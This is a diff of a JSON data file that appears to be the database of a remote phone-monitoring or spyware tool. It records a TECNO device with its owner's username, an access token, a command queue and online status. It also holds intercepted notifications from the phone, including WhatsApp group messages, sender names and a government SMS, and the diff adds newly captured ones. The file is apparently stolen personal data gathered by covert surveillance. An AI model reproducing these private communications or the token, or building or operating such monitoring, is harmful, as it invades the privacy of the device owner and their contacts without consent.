@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1963 pesan dari 18 chat",
+        "time": "29/04 16:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777451182424
+      },
+      {
+        "appName": "Messages",
+        "sender": "KEMENKES",
+        "content": "Pastikan Imunisasi Lengkap Sesuai Usia; Lindungi Keluarga, Lengkapi Imunisasi Sejak Dini; Bawalah Anak Ke Pos Pelayanan Imunisasi Sesuai Jadwal.",
+        "time": "29/04 16:37",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777451178676
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎STOK AXEL 17 STR #1 (44 pesan): ~ RAMZ STR REGION SUKABUMI",
         "content": "📷 PRIBADI OP? 1,1JT NEPIS SG OPM MATEL EVO AQUA PRIME 6 GENJI ON S8 ON SEMI OLD MAX 3 TOPI VALDEZ ON JOKER ITEM ON\n(open tt bt)",
         "time": "29/04 16:37",
@@ -4003,22 +4019,6 @@
         "time": "29/04 16:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1777450485312
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (1420 pesan): ~ dika",
-        "content": "💟 Stiker",
-        "time": "29/04 16:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777450473583
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB || ISIAN  LYEZ STORE X ALL OWN (63 pesan): ~ ---'",
-        "content": "Eneke",
-        "time": "29/04 16:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777450473396
       }
     ],
     "galleryPhotos": [],
@@ -17693,7 +17693,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "ec086158f264712088f909b50de18009",
-    "lastSeen": 1777451176446,
+    "lastSeen": 1777451182404,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T08:23:06.915Z",
